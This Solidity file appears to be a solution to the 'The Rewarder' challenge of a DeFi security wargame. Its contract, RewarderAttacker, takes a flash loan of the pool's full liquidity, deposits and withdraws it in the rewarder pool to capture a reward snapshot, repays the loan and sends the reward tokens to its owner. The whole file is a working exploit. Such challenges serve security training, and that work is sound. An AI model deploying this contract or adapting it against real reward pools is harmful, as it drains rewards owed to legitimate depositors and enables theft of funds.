// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;
import '../../the-rewarder/TheRewarderPool.sol';
import '../../the-rewarder/FlashLoanerPool.sol';

contract RewarderAttacker {
    FlashLoanerPool immutable loanPool;
    TheRewarderPool immutable rewarderPool;
    address immutable owner;

    constructor(
        FlashLoanerPool _loanPool, 
        TheRewarderPool _rewarderPool
    ) {
        require(_loanPool.liquidityToken() == _rewarderPool.liquidityToken(), 'Liquidity tokens does not match');

        loanPool = _loanPool;
        rewarderPool = _rewarderPool;
        owner = msg.sender;
    }

    function flashLoan() external {
        require(msg.sender == owner, 'Only the owner is allowed to call flashLoan');

        loanPool.flashLoan(
            loanPool.liquidityToken().balanceOf(address(loanPool))
        );
    }

    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(loanPool), 'Only the loanPool is allowed to call receiveFlashLoan');

        rewarderPool.liquidityToken().approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        rewarderPool.liquidityToken().transfer(address(loanPool), amount);

        rewarderPool.rewardToken().transfer(
            owner, 
            rewarderPool.rewardToken().balanceOf(address(this))
        );
    }
}